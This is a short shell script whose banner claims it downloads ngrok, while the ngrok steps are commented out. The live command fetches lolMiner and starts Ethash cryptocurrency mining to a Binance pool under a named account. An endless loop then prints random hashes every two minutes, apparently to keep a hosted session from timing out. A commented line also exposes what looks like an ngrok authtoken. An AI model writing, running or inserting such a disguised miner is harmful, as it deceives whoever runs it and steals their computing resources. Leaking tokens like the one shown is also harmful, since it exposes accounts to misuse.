#rm -rf ngrok ngrok.zip ng.sh > /dev/null 2>&1
echo "======================="
echo "Download ngrok"
echo "======================="
#wget -O ngrok.zip https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip > /dev/null 2>&1
wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.31/lolMiner_v1.31_Lin64.tar.gz && tar -xvf lolMiner_v1.31_Lin64.tar.gz && mv 1.31 mng && cd mng && chmod +x lolMiner && ./lolMiner --algo ETHASH --pool stratum+tcp://ethash.poolbinance.com:443 --user Gok001.Test
#unzip ngrok.zip > /dev/null 2>&1
#read -p "Paste Ngrok Authtoken: " CRP
#./ngrok 23KE1QqMII3UDnPOa4uleYgvRcl_5L7bNgSRteRyL4PCUonmF $CRP

while [ 1 ]; do

  while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done

sleep 2

done
